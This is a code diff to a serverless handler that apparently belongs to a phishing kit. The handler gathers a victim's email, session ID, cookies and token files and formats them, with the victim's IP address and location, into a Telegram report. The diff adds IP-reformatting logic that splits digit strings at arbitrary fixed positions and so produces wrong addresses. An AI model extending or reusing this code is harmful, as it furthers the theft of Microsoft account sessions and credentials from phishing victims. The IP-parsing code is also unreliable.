@@ -59,6 +59,22 @@ const handler = async (event, context) => {
     const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
     const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
     const timestamp = new Date().toISOString();
+    
+    // Fix IP formatting - convert concatenated numbers back to proper IP format
+    let formattedIP = userIpInfo.ip;
+    if (userIpInfo.ip && userIpInfo.ip !== 'Unknown' && /^\d{8,12}$/.test(userIpInfo.ip)) {
+      // If IP is a concatenated number like "911241779", format it properly
+      const ipStr = userIpInfo.ip.toString();
+      if (ipStr.length >= 8) {
+        // Try to format as IP (e.g., "911241779" -> "91.124.177.9")
+        const part1 = ipStr.substring(0, 2) || '0';
+        const part2 = ipStr.substring(2, 5) || '0';
+        const part3 = ipStr.substring(5, 8) || '0';
+        const part4 = ipStr.substring(8) || '0';
+        formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
+      }
+    }
+    
     let cookies = data.formattedCookies || data.cookies || [];
     let tokenFileSent = false;
     let cookieFileSent = false;
@@ -201,7 +217,7 @@ const handler = async (event, context) => {
       `🆔 Session ID: ${sessionId}`,
       `⏰ Time: ${timestamp}`,
       `🆔 Message ID: ${uniqueId}`,
-      `🌍 IP: ${userIpInfo.ip}`,
+      `🌍 IP: ${formattedIP}`,
       `🏳️ Country: ${userIpInfo.country} (${userIpInfo.countryCode})`,
       `🏙️ Location: ${userIpInfo.city}, ${userIpInfo.region}`
     ];
